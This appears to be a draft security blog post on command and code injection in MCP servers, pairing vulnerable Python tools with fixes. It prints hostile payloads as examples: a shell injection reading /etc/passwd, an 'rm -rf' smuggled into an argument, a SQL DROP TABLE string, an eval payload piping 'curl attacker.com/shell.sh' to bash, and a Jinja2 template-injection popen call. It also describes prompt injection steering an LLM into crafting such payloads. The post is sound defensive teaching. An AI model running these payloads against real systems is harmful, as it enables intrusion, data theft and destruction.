---
title: "MCP Top 10 — #8: Command & Code Injection"
date: 2026-04-12
draft: true
tags: [ai, mcp-security, owasp]
series: ["OWASP MCP Top 10"]
weight: 8
---

# MCP Top 10 — #8: Command & Code Injection

**When Tools Execute the Unintended**

---

## What It Is

Command & Code Injection in the MCP context occurs when an attacker — whether through prompt injection, malicious tool descriptions, or direct input manipulation — causes an MCP server to execute arbitrary system commands or code. This is the classic injection vulnerability, but with a new twist: the "user input" is coming from an LLM that may itself be under the influence of an attacker.

Many MCP servers interact with system resources through shell commands, database queries, or code interpreters. When the parameters for these interactions come from LLM outputs — which are influenced by user prompts, tool descriptions, and tool results from potentially untrusted sources — the entire input chain is potentially attacker-controlled.

## Why It Matters

Command injection in MCP tools provides **direct code execution on the host system**, making it one of the highest-impact vulnerabilities:

- **Full system compromise.** A successful command injection gives the attacker the ability to run arbitrary code with the permissions of the MCP server process (typically the user's full permissions).
- **Persistence.** Injected commands can install backdoors, create cron jobs, modify startup scripts, or add SSH keys.
- **Lateral movement.** From a compromised developer workstation, an attacker can reach internal networks, cloud resources, and production systems.
- **Supply chain attacks.** Injected commands can modify source code, build scripts, or CI/CD configurations.

### Threat Scenario

A developer uses an MCP server that provides Git integration. The server exposes a `search_commits` tool:

```python
@server.tool()
async def search_commits(query: str, author: str = None):
    """Search git commits by message content."""
    cmd = f"git log --oneline --grep='{query}'"
    if author:
        cmd += f" --author='{author}'"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout
```

The developer asks: "Search for commits related to the authentication fix."

But what if a prompt injection causes the LLM to call the tool with:

```json
{"query": "auth'; cat /etc/passwd; echo '"}
```

The executed command becomes:
```bash
git log --oneline --grep='auth'; cat /etc/passwd; echo ''
```

The server dutifully executes all three commands and returns the output, including the contents of `/etc/passwd`.

## How It Works

### Shell Command Injection

The most common pattern. MCP servers that construct shell commands from tool parameters:

**Vulnerable Pattern:**
```python
@server.tool()
async def find_files(pattern: str, directory: str):
    """Find files matching a pattern."""
    cmd = f"find {directory} -name '{pattern}'"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout
```

**Injection:**
```json
{"pattern": "*.py", "directory": "/tmp; rm -rf /home/user/project; echo"}
```

**Safe Alternative:**
```python
@server.tool()
async def find_files(pattern: str, directory: str):
    """Find files matching a pattern."""
    # Never use shell=True with untrusted input
    result = subprocess.run(
        ["find", directory, "-name", pattern],
        capture_output=True, text=True
    )
    return result.stdout
```

### SQL Injection

MCP servers that query databases with string-formatted SQL:

**Vulnerable Pattern:**
```python
@server.tool()
async def query_users(name_filter: str):
    """Search for users by name."""
    sql = f"SELECT * FROM users WHERE name LIKE '%{name_filter}%'"
    cursor.execute(sql)
    return cursor.fetchall()
```

**Injection:**
```json
{"name_filter": "'; DROP TABLE users; --"}
```

**Safe Alternative:**
```python
@server.tool()
async def query_users(name_filter: str):
    """Search for users by name."""
    sql = "SELECT * FROM users WHERE name LIKE %s"
    cursor.execute(sql, (f"%{name_filter}%",))
    return cursor.fetchall()
```

### Code Evaluation Injection

MCP servers that execute code dynamically:

**Vulnerable Pattern:**
```python
@server.tool()
async def calculate(expression: str):
    """Evaluate a mathematical expression."""
    result = eval(expression)  # NEVER do this
    return str(result)
```

**Injection:**
```json
{"expression": "__import__('os').system('curl attacker.com/shell.sh | bash')"}
```

**Safe Alternative:**
```python
import ast
import operator

SAFE_OPS = {
    ast.Add: operator.add, ast.Sub: operator.sub,
    ast.Mult: operator.mul, ast.Div: operator.truediv,
}

@server.tool()
async def calculate(expression: str):
    """Evaluate a mathematical expression."""
    tree = ast.parse(expression, mode='eval')
    return str(_safe_eval(tree.body))

def _safe_eval(node):
    if isinstance(node, ast.Constant) and isinstance(node.value, (int, float)):
        return node.value
    elif isinstance(node, ast.BinOp) and type(node.op) in SAFE_OPS:
        return SAFE_OPS[type(node.op)](_safe_eval(node.left), _safe_eval(node.right))
    raise ValueError(f"Unsupported expression: {ast.dump(node)}")
```

### Template Injection

MCP servers that render templates with user-controlled content:

**Vulnerable Pattern:**
```python
from jinja2 import Template

@server.tool()
async def render_template(template_str: str, variables: dict):
    """Render a text template with variables."""
    template = Template(template_str)
    return template.render(**variables)
```

**Injection:**
```json
{
  "template_str": "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}",
  "variables": {}
}
```

### The LLM as Injection Proxy

What makes MCP command injection uniquely dangerous is the LLM acting as an intermediary:

```
Attacker → Prompt Injection → LLM → Tool Call with injected parameters → MCP Server → System
```

The LLM may "sanitize" or "reformulate" some injections (accidentally, not by design), but it can also *construct more sophisticated injections* than a human attacker might. If the LLM is instructed to "call the search tool with a query that also lists environment variables," it can craft a working injection payload because it understands shell syntax.

Traditional injection defenses assume the attacker is limited to what they can type into an input field. With LLM-mediated injection, the attacker has a sophisticated code generation engine constructing the payload.

## Detection

### Static Analysis of MCP Servers

1. **Identify all shell execution points.** Search for `subprocess`, `os.system`, `os.popen`, `exec`, `eval`, backtick operators, and similar patterns.
2. **Check for parameterized queries.** Any SQL that uses string formatting instead of parameterized queries is vulnerable.
3. **Flag dynamic code evaluation.** Any use of `eval()`, `exec()`, `Function()`, or template rendering with user-controlled input.
4. **Verify input validation.** Check that all tool parameters are validated before use in system calls.

### Runtime Detection

1. **Monitor spawned processes.** Track child processes created by MCP servers. A "file search" tool spawning `curl` or `wget` is suspicious.
2. **System call monitoring.** Use eBPF or similar to detect unexpected system calls from MCP server processes.
3. **Command logging.** Log all commands executed by MCP servers and alert on suspicious patterns.
4. **Database query logging.** Monitor SQL queries for injection patterns.

## Mitigation

### For MCP Server Developers

1. **Never use `shell=True` with untrusted input.** Pass commands as arrays to avoid shell interpretation:
   ```python
   # Bad
   subprocess.run(f"git log --grep='{query}'", shell=True)
   
   # Good
   subprocess.run(["git", "log", f"--grep={query}"])
   ```

2. **Always use parameterized queries.** Never format user input into SQL strings:
   ```python
   # Bad
   cursor.execute(f"SELECT * FROM users WHERE name = '{name}'")
   
   # Good
   cursor.execute("SELECT * FROM users WHERE name = %s", (name,))
   ```

3. **Never use `eval()` or `exec()` with tool parameters.** If you need dynamic evaluation, use a sandboxed interpreter or a safe expression parser.

4. **Input validation and sanitization.** Validate all tool parameters against expected patterns:
   ```python
   import re
   
   @server.tool()
   async def search_commits(query: str):
       # Validate: only alphanumeric, spaces, and basic punctuation
       if not re.match(r'^[\w\s\-\.,:;!?]+$', query):
           raise ValueError("Invalid search query")
       # ...
   ```

5. **Use libraries instead of shell commands.** Instead of shelling out to `git`, use `gitpython`. Instead of shelling out to `find`, use `pathlib.glob()`.

### For Organizations

1. **Security review all MCP servers for injection vulnerabilities** before deployment. This is standard AppSec practice applied to a new attack surface.
2. **Run MCP servers in sandboxed environments** with restricted system call access:
   - Containers with read-only filesystems
   - seccomp profiles that restrict dangerous system calls
   - AppArmor/SELinux profiles that limit process capabilities
3. **Implement a WAF-like layer for MCP.** Inspect tool call parameters for injection patterns before they reach the server.
4. **Static analysis in CI/CD.** Add SAST tools to scan MCP server code for injection vulnerabilities as part of the build process.

### For MCP Client Developers

1. **Parameter sanitization.** Before sending tool call parameters to the server, validate them against the declared schema and reject suspicious content.
2. **Escape detection.** Flag tool calls where parameters contain shell metacharacters, SQL keywords, or code evaluation patterns.
3. **Output sanitization.** If a tool returns what looks like command output (process lists, file contents from unexpected paths), flag it.

## Key Takeaways

- MCP servers that execute shell commands, SQL queries, or dynamic code with LLM-provided parameters are vulnerable to injection attacks.
- The LLM acts as an injection proxy — it can construct sophisticated payloads and may be manipulated into doing so via prompt injection.
- Classic injection defenses apply: parameterized queries, array-based command execution, input validation, and no `eval()`.
- The unique MCP risk is that the "user input" comes from an LLM influenced by potentially attacker-controlled content (tool descriptions, tool results, user messages).
- Defense requires secure coding practices in MCP servers, sandboxed execution environments, and parameter validation at both the client and server level.

---

*Next: [#9 — Insecure Transport & Authentication: When the Wire Is the Weakness](09-insecure-transport.md)*
